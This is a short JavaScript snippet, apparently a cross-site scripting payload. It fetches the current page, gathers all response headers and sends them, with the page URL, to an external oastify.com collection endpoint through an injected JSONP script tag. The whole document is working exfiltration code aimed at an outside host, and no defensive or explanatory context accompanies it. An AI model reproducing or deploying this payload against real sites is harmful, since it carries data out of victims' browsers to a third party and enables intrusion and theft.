(function() {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', window.location.href, true);
    xhr.onreadystatechange = function() {
        if (xhr.readyState === XMLHttpRequest.DONE) {
            var headers = xhr.getAllResponseHeaders();
            var headersList = headers.split('\r\n').reduce(function(acc, current) {
                var parts = current.split(': ');
                if (parts.length === 2) {
                    acc[parts[0]] = parts[1];
                }
                return acc;
            }, {});

            // Create JSONP request
            var script = document.createElement('script');
            script.src = 'https://1z1udt6hwgysnq949cdxlfz4nvtmhhc51.oastify.com/collect-headers?callback=sendHeaders&url=' + encodeURIComponent(window.location.href) + '&headers=' + encodeURIComponent(JSON.stringify(headersList));
            document.body.appendChild(script);
        }
    };
    xhr.send();
})();

// Define the JSONP callback function
function sendHeaders(data) {
    console.log('Headers sent:', data);
}
